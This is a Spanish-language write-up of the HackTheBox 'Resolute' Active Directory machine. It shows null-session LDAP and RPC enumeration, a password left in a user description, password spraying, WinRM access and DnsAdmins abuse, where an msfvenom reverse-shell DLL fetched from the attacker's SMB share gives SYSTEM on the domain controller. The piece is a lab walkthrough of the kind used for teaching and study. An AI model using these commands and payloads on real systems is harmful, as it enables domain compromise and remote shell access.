---
title: Resolute - Write Up (HTB) ❤
author: sha16
categories: [HackTheBox, Active Directory]
tags: [Abusing DNSAdmins Group, Active Directory, Null Session via RPC, Password Spraying, Password exposed via RPC, Windows]
---

Buenas a tod@s, el día de hoy les traigo un `write-up` de la máquina `Resolute` de `HackTheBox`.  

![Untitled](/assets/img/htb/machines/Resolute/Untitled.png)

Como en cada `write-up`, lo primero hacemos es lanzar un escaneo de puertos con `nmap` con el objetivo de identificar potenciales vías de ataque. 

Como podrán ver a continuación, se específica el parámetro `-sS` con el objetivo de que el escaneo sea vía `TCP SYNC`, lo que de cierto modo me permitirá agilizarlo, debido a que no hay `Three-Way-HandShake` como en `TCP`.

Lo otro es que se configura el `--min-rate` en `3000` con la idea de no enviar una cantidad menor a `3000` paquetes por segundo.

**Advertencia:** No aconsejo lanzar este escaneo en entornos productivos debido a que es ultra ruidoso y agresivo. En este caso lo estoy lanzando en un entorno controlado de `HackTheBox`.

```bash
nmap -v -sS --min-rate 3000 -n -Pn -p- 10.10.10.169 -oG tcp_ports.txt
```

![Untitled](/assets/img/htb/machines/Resolute/Untitled%201.png)

En el resultado del escaneo, se identifican varios servicios de interés, entre ellos: WinRPC, SMB, LDAP, WinRM y Kerberos. Sin embargo, ya con sólo ver al servicio `Kerberos`, podemos deducir que estamos ante un entorno de *Active Directory*. Por lo que ya podemos saber más o menos cómo enforcar nuestra estrategia de ataque y enumeración.

```bash
nmap -v -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49682,49714,49839 10.10.10.169 -oN port_scan.txt
```

![Untitled](/assets/img/htb/machines/Resolute/Untitled%202.png)

Uno de los primeros problemas de seguridad que identificamos al enumerar la máquina, es que te puedes autenticar sobre el servicio LDAP sin necesidad de una contraseña, pudiendo listar información sensible del dominio, tal como usuarios, propiedades de objetos, etc.

```bash
ldapsearch -H ldap://10.10.10.169 -w '' -x -b 'DC=megabank,DC=local'
```

![Untitled](/assets/img/htb/machines/Resolute/Untitled%203.png)

De la misma forma, esto ocurre con WinRPC, donde nos podemos autenticarnos con el *null session* y listar a todos los usuarios del dominio.

```bash
rpcclient -N -U '' megabank.local
```

![Untitled](/assets/img/htb/machines/Resolute/Untitled%204.png)

Al listar las descripciones de cada usuario, identificamos que en la del usuario `marko` hay una contraseña `Welcome123!`.

![Untitled](/assets/img/htb/machines/Resolute/Untitled%205.png)

Teniendo una contraseña potencialmente válida, realizamos un *Password Sprying* donde identificamos que esta la pertenece al usuario `melanie`.

![Untitled](/assets/img/htb/machines/Resolute/Untitled%206.png)

Al validar la credencial sobre el servicio WinRM, descubrimos que el usuario `melanie` forma parte del grupo `Remote Management Users`, por lo que podemos obtener acceso directo hacía una consola en el servidor con la herramienta `evil-winrm`. 

![Untitled](/assets/img/htb/machines/Resolute/Untitled%207.png)

Habiendo obtenido acceso al servidor, identificamos la carpeta `PSTranscripts`, la cual no forma parte del listado común de directorios en la raíz de los sistemas operativos Windows. 

![Untitled](/assets/img/htb/machines/Resolute/Untitled%208.png)

Al revisar dicho directorio, se identifica otro directorio dentro de este, el cual posee un archivo de texto.

![Untitled](/assets/img/htb/machines/Resolute/Untitled%209.png)

Al revisar dicho archivo, se identifican comandos de consola, los cuales muestran intentos de autenticación sobre un recurso de red, con la contraseña del usuario `ryan`.

![Untitled](/assets/img/htb/machines/Resolute/Untitled%2010.png)

Esta contraseña es validada con `crackmapexec`, herramienta con la cual validamos que el usuario `ryan` también pertenece al grupo `Remote Management Users`. 

![Untitled](/assets/img/htb/machines/Resolute/Untitled%2011.png)

Posterior a esto, antes de autenticarnos con el usuario `ryan`, lanzamos la herramienta `SharpHound.exe`, con el objetivo de listar potenciales vectores de ataque que puedan existir entre las relaciones establecidas entre los distintos objetos que componen al AD. 

```powershell
cmd /c SharpHound.exe --CollectionMethods All
```

![Untitled](/assets/img/htb/machines/Resolute/Untitled%2012.png)

Analizando el esquema de relación, detectamos que el usuario forma parte del grupo `Contractors`, el cual a su vez pertenece al grupo privilegiado, `DnsAdmins`. 

En este punto, hemos encontrado el vector de escalada de privilegios, debido a que el grupo `DnsAdmins` forma parte de los objetos críticos del directorio activo. Esto significa que, un usuario que forma parte de este, tiene la capacidad de controlar la totalidad del servicio, incluida las DLLs que se ejecutan en contexto privilegiado. 

![Untitled](/assets/img/htb/machines/Resolute/Untitled%2013.png)

Por lo tanto, dado que tenemos control total del servicio, podemos crear una DLL maliciosa con la herramienta `MSFvenom`, la cual nos está compilada para enviarnos una *reverse shell* a nuestra máquina, al puerto `443` en escucha. 

Es importante destacar que esta DLL, sobre la cual tenemos control, se ejecuta en un contexto de máximos privilegios en el servidor.

```powershell
msfvenom -a x64 -p windows/x64/shell_reverse_tcp -e x64/xor LHOST=10.10.17.210 LPORT=443 -f dll -o dnsadmin_priv.dll
```

![Untitled](/assets/img/htb/machines/Resolute/Untitled%2014.png)

Posterior a esto, con la herramienta `dnscmd.exe`, la cual es utilizada para administrar el DNS, añadimos a la DLL maliciosa como un *plugin* del servicio.

Cabe destacar que la DLL se encuentra servida en una carpeta compartida por SMB, en nuestro servidor atacante. 

```powershell
dnscmd.exe RESOLUTE /config /serverlevelplugindll \\10.10.17.210\smb\dnsadmin_priv.dll
```

![Untitled](/assets/img/htb/machines/Resolute/Untitled%2015.png)

Como se observó en la imagen anterior, la configuración es aplicada exitosamente.

En base a esto, se reinicia el servidor DNS, lo cual provoca que automáticamente se invoque y ejecute nuestra DLL, a través del servicio SMB. 

![Untitled](/assets/img/htb/machines/Resolute/Untitled%2016.png)

Habiéndose ejecutado, recibimos con éxito la *reverse shell* de `NT Authority\System`, en el puerto en escucha de nuestra máquina. De esta manera, logramos control total del *Domain Controller*.

![Untitled](/assets/img/htb/machines/Resolute/Untitled%2017.png)

### Referencias

- DNSAdmin to DC compromise in one line (by Shay Ber): [https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83)
- dnscmd (Microsoft Learn): [https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd)
- DnsAdmins to DomainAdmin: [https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/](https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/)